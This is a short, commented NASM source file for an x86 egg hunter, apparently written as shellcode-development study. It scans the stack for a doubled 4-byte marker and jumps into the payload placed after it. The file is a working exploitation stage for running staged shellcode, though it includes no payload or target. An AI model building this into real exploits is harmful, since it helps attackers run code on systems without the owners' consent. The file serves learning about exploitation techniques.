; File: egghunter_no_memcheck.nasm


global _start

section .text

_start:

    ; suppose we know our payload is located somewhere in stack
    ; so let crawler start from ESP
    mov eax, esp

    ; define egg
    ; note that egg must contain valid opcodes because
    ; it will get executed before payload
    mov edx, 0x464e464e     ; inc esi, dec esi, inc esi, dec esi

search_first_egg:

    inc eax                 ; step to next byte
    cmp dword [eax], edx    ; compare 4 bytes in eax and egg in edx
    jne search_first_egg    ; repeat loop if not match

search_second_egg:

    ; CAUTION
    ; Egg will be contained in .data section of binary which
    ; will be created using this egg hunter shellcode
    ; If you are crawling even .data section you must count with that.
    ; Prepend the payload shellcode twice and let the egg hunter find
    ; two consecutive eggs.

    cmp dword [eax+4], edx
    jne search_first_egg

egg_found:

    ; load eip with eax, execute egg, execute payload
    jmp eax
